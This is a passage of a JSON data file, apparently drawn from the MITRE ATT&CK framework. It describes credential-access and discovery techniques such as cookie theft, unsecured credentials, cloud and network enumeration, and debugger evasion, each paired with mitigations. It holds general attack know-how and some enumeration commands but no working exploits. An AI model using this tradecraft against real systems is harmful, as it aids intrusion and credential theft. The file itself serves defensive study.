        { "type": "code", "content": "KRB5CCNAME" },
        {
          "type": "text",
          "content": " environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using "
        },
        { "type": "code", "content": "kinit" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "klist" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "ktutil" },
        { "type": "text", "content": ", and " },
        { "type": "code", "content": "kcc" },
        {
          "type": "text",
          "content": " built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days."
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts."
            }
          ],
          [
            {
              "type": "text",
              "content": "Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1539",
    "name": "Steal Web Session Cookie",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website."
        }
      ],
      [
        {
          "type": "text",
          "content": "Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols."
        }
      ],
      [
        {
          "type": "text",
          "content": "There are several examples of malware targeting cookies from web browsers on the local system. There are also open source frameworks such as "
        },
        { "type": "code", "content": "Evilginx2" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "Muraena" },
        {
          "type": "text",
          "content": " that can gather session cookies through a malicious proxy (ex: Adversary-in-the-Middle) that can be set up by an adversary and used in phishing campaigns."
        }
      ],
      [
        {
          "type": "text",
          "content": "After an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "A physical second factor key that uses the target login domain as part of the negotiation protocol will prevent session cookie theft through proxy methods."
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Configure browsers or tasks to regularly delete persistent cookies."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Train users to identify aspects of phishing attempts where they're asked to enter credentials into a site that has the incorrect domain for the application they are logging into."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552",
    "name": "Unsecured Credentials",
    "tactics": [{ "id": "TA0006", "name": "Credential Access" }],
    "subs": [
      { "id": "T1552.001", "name": "Credentials In Files" },
      { "id": "T1552.002", "name": "Credentials in Registry" },
      { "id": "T1552.003", "name": "Bash History" },
      { "id": "T1552.004", "name": "Private Keys" },
      { "id": "T1552.005", "name": "Cloud Instance Metadata API" },
      { "id": "T1552.006", "name": "Group Policy Preferences" },
      { "id": "T1552.007", "name": "Container API" },
      { "id": "T1552.008", "name": "Chat Messages" }
    ],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. Private Keys)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Remove vulnerable Group Policy Preferences."
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Preemptively search for files containing passwords or other credentials and take actions to reduce the exposure risk when found."
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": [
          [
            {
              "type": "text",
              "content": "When possible, store keys on separate cryptographic hardware instead of on the local system. "
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "Filter Network Traffic",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit access to the Instance Metadata API. A properly configured Web Application Firewall (WAF) may help prevent external adversaries from exploiting Server-side Request Forgery (SSRF) attacks that allow access to the Cloud Instance Metadata API."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit network access to sensitive services, such as the Instance Metadata API."
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "There are multiple methods of preventing a user's command history from being flushed to their .bash_history file, including use of the following commands:"
            },
            { "type": "code", "content": "set +o history" },
            { "type": "text", "content": " and " },
            { "type": "code", "content": "set -o history" },
            { "type": "text", "content": " to start logging again;" },
            { "type": "code", "content": "unset HISTFILE" },
            {
              "type": "text",
              "content": " being added to a user's .bash_rc file; and"
            },
            { "type": "code", "content": "ln -s /dev/null ~/.bash_history" },
            { "type": "text", "content": " to write commands to " },
            { "type": "code", "content": "/dev/null" },
            { "type": "text", "content": "instead." }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Use strong passphrases for private keys to make cracking difficult. Do not store credentials within the Registry. Establish an organizational policy that prohibits password storage in files."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "If it is necessary that software must store credentials in the Registry, then ensure the associated accounts have limited permissions so they cannot be abused if obtained by an adversary."
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "Restrict File and Directory Permissions",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict file shares to specific directories with access only to necessary users."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Apply patch KB2962486 which prevents credentials from being stored in GPPs."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1087",
    "name": "Account Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [
      { "id": "T1087.001", "name": "Local Account" },
      { "id": "T1087.002", "name": "Domain Account" },
      { "id": "T1087.003", "name": "Email Account" },
      { "id": "T1087.004", "name": "Cloud Account" }
    ],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment."
        }
      ],
      [
        {
          "type": "text",
          "content": "For examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Prevent administrator accounts from being enumerated when an application is elevating through UAC since it can lead to the disclosure of account names. The Registry key is located "
            },
            {
              "type": "code",
              "content": "HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators"
            },
            {
              "type": "text",
              "content": ". It can be disabled through GPO: Computer Configuration > [Policies] > Administrative Templates > Windows Components > Credential User Interface: E numerate administrator accounts on elevation. "
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1010",
    "name": "Application Window Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1217",
    "name": "Browser Information Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure."
        }
      ],
      [
        {
          "type": "text",
          "content": "Browser information may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser."
        }
      ],
      [
        {
          "type": "text",
          "content": "Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., "
        },
        { "type": "code", "content": "%APPDATA%/Google/Chrome" },
        { "type": "text", "content": ")." }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1580",
    "name": "Cloud Infrastructure Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services."
        }
      ],
      [
        {
          "type": "text",
          "content": "Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a "
        },
        { "type": "code", "content": "DescribeInstances" },
        {
          "type": "text",
          "content": " API within the Amazon EC2 API that can return information about one or more instances within an account, the "
        },
        { "type": "code", "content": "ListBuckets" },
        {
          "type": "text",
          "content": " API that returns a list of all buckets owned by the authenticated sender of the request, the "
        },
        { "type": "code", "content": "HeadBucket" },
        {
          "type": "text",
          "content": " API to determine a bucket’s existence along with access permissions of the request sender, or the "
        },
        { "type": "code", "content": "GetPublicAccessBlock" },
        {
          "type": "text",
          "content": " API to retrieve access block configuration for a bucket. Similarly, GCP's Cloud SDK CLI provides the "
        },
        { "type": "code", "content": "gcloud compute instances list" },
        {
          "type": "text",
          "content": " command to list all Google Compute Engine instances in a project , and Azure's CLI command "
        },
        { "type": "code", "content": "az vm list" },
        {
          "type": "text",
          "content": " lists details of virtual machines. In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning."
        }
      ],
      [
        {
          "type": "text",
          "content": "An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user. The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as "
        },
        { "type": "code", "content": "DescribeDBInstances" },
        {
          "type": "text",
          "content": " to determine size, owner, permissions, and network ACLs of database resources.  Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit permissions to discover cloud infrastructure in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1538",
    "name": "Cloud Service Dashboard",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports."
        }
      ],
      [
        {
          "type": "text",
          "content": "Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce the principle of least-privilege by limiting dashboard visibility to only the resources required. This may limit the discovery value of the dashboard in the event of a compromised account."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1526",
    "name": "Cloud Service Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity."
        }
      ],
      [
        {
          "type": "text",
          "content": "For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Logs."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1619",
    "name": "Cloud Storage Object Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to File and Directory Discovery on a local host, after identifying available storage services (i.e. Cloud Infrastructure Discovery) adversaries may access the contents/objects stored in cloud infrastructure."
        }
      ],
      [
        {
          "type": "text",
          "content": "Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS  and List Blobs in Azure ."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Restrict granting of permissions related to listing objects in cloud storage to necessary accounts."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1613",
    "name": "Container and Resource Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster."
        }
      ],
      [
        {
          "type": "text",
          "content": "These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs. In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. "
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit communications with the container service to managed and secured channels, such as local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API and Kubernetes API Server. In Kubernetes clusters deployed in cloud environments, use native cloud platform features to restrict the IP ranges that are permitted to access to API server. Where possible, consider enabling just-in-time (JIT) access to the Kubernetes API to place additional restrictions on access."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce the principle of least privilege by limiting dashboard visibility to only the required users. When using Kubernetes, avoid giving users wildcard permissions or adding users to the "
            },
            { "type": "code", "content": "system:masters" },
            { "type": "text", "content": " group, and use " },
            { "type": "code", "content": "RoleBindings" },
            { "type": "text", "content": " rather than " },
            { "type": "code", "content": "ClusterRoleBindings" },
            {
              "type": "text",
              "content": " to limit user privileges to specific namespaces."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1622",
    "name": "Debugger Evasion",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0007", "name": "Discovery" }
    ],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads."
        }
      ],
      [
        {
          "type": "text",
          "content": "Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads."
        }
      ],
      [
        {
          "type": "text",
          "content": "Specific checks will vary based on the target and/or adversary, but may involve Native API function calls such as "
        },
        { "type": "code", "content": "IsDebuggerPresent()" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": " NtQueryInformationProcess()" },
        { "type": "text", "content": ", or manually checking the " },
        { "type": "code", "content": "BeingDebugged" },
        {
          "type": "text",
          "content": " flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as "
        },
        { "type": "code", "content": "OutputDebugStringW()" },
        { "type": "text", "content": "." }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1652",
    "name": "Device Driver Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Many OS utilities may provide information about local device drivers, such as "
        },
        { "type": "code", "content": "driverquery.exe" },
        { "type": "text", "content": " and the " },
        { "type": "code", "content": "EnumDeviceDrivers()" },
        {
          "type": "text",
          "content": " API function on Windows. Information about device drivers (as well as associated services, i.e., System Service Discovery) may also be available in the Registry."
        }
      ],
      [
        {
          "type": "text",
          "content": "On Linux/macOS, device drivers (in the form of kernel modules) may be visible within "
        },
        { "type": "code", "content": "/dev" },
        { "type": "text", "content": " or using utilities such as " },
        { "type": "code", "content": "lsmod" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "modinfo" },
        { "type": "text", "content": "." }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1482",
    "name": "Domain Trust Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain. Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting. Domain trusts can be enumerated using the "
        },
        { "type": "code", "content": "DSEnumerateDomainTrusts()" },
        {
          "type": "text",
          "content": " Win32 API call, .NET methods, and LDAP. The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Map the trusts within existing domains/forests and keep trust relationships to a minimum."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Employ network segmentation for sensitive domains.."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1083",
    "name": "File and Directory Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions."
        }
      ],
      [
        {
          "type": "text",
          "content": "Many command shell utilities can be used to obtain this information. Examples include "
        },
        { "type": "code", "content": "dir" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "tree" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "ls" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "find" },
        { "type": "text", "content": ", and " },
        { "type": "code", "content": "locate" },
        {
          "type": "text",
          "content": ". Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. "
        },
        { "type": "code", "content": "dir" },
        { "type": "text", "content": ", " },
        { "type": "code", "content": "show flash" },
        { "type": "text", "content": ", and/or " },
        { "type": "code", "content": "nvram" },
        { "type": "text", "content": ")." }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1615",
    "name": "Group Policy Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path "
        },
        {
          "type": "code",
          "content": "\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\"
        },
        { "type": "text", "content": "." }
      ],
      [
        { "type": "text", "content": "Adversaries may use commands such as " },
        { "type": "code", "content": "gpresult" },
        {
          "type": "text",
          "content": " or various publicly available PowerShell functions, such as "
        },
        { "type": "code", "content": "Get-DomainGPO" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "Get-DomainGPOLocalGroup" },
        {
          "type": "text",
          "content": ", to gather information on Group Policy settings. Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. Domain Policy Modification) for their benefit."
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features."
      }
    ]
  },
  {
    "id": "T1654",
    "name": "Log Enumeration",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may enumerate system and service logs to find useful data. These logs may highlight various types of valuable insights for an adversary, such as user authentication records (Account Discovery), security or vulnerable software (Software Discovery), or hosts within a compromised network (Remote System Discovery)."
        }
      ],
      [
        {
          "type": "text",
          "content": "Host binaries may be leveraged to collect system logs. Examples include using "
        },
        { "type": "code", "content": "wevtutil.exe" },
        {
          "type": "text",
          "content": " or PowerShell on Windows to access and/or export security event information. In cloud environments, adversaries may leverage utilities such as the Azure VM Agent’s "
        },
        { "type": "code", "content": "CollectGuestLogs.exe" },
        {
          "type": "text",
          "content": " to collect security logs from cloud hosted infrastructure."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also target centralized logging infrastructure such as SIEMs. Logs may also be bulk exported and sent to adversary-controlled infrastructure for offline analysis."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the ability to access and export sensitive logs to privileged accounts where possible."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1046",
    "name": "Network Service Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "3.1",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port and/or vulnerability scans using tools that are brought onto a system. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well."
        }
      ],
      [
        {
          "type": "text",
          "content": "Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as "
        },
        { "type": "code", "content": "dns-sd -B _ssh._tcp ." },
        {
          "type": "text",
          "content": ") to find other systems broadcasting the ssh service."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Use network intrusion detection/prevention systems to detect and prevent remote service scans."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure proper network segmentation is followed to protect critical servers and devices."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1135",
    "name": "Network Share Discovery",
    "tactics": [{ "id": "TA0007", "name": "Discovery" }],
    "subs": [],
    "version": "3.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. "
        }
      ],
      [
        {
          "type": "text",
          "content": "File sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the "
        },
        { "type": "code", "content": "net view \\\\remotesystem" },
        {
          "type": "text",
          "content": " command. It can also be used to query shared drives on the local system using "
        },
        { "type": "code", "content": "net share" },
        { "type": "text", "content": ". For macOS, the " },
        { "type": "code", "content": "sharing -l" },
        {
          "type": "text",
          "content": " command lists all shared points used for smb services."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "Operating System Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Enable Windows Group Policy \"Do Not Allow Anonymous Enumeration of SAM Accounts and Shares\" security setting to limit users who can enumerate network shares."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1040",
    "name": "Network Sniffing",
    "tactics": [
      { "id": "TA0006", "name": "Credential Access" },
      { "id": "TA0007", "name": "Discovery" }
    ],
    "subs": [],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data."
        }
      ],
      [
        {
          "type": "text",
